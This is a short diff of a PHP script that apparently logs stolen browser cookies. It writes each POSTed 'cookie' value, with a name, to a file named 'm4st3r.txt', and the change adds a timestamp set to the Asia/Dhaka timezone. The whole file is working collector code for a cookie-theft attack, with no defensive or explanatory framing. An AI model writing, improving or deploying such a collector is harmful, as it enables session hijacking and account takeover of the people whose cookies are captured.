@@ -19,7 +19,8 @@ $cookie = $_POST['cookie'];
 $fifo = fopen('m4st3r.txt', 'a');
 
 if (is_null($cookie) == FALSE) {
-    fwrite($fifo, "----- [".$name."] -----\n");
+    date_default_timezone_set("Asia/Dhaka");
+    fwrite($fifo, "----- [".$name."] -----\nTime : ".date('h:i:s A')."\n");
     fwrite($fifo, $cookie);
     fwrite($fifo, "\n----- [END] -----\n\n");
 
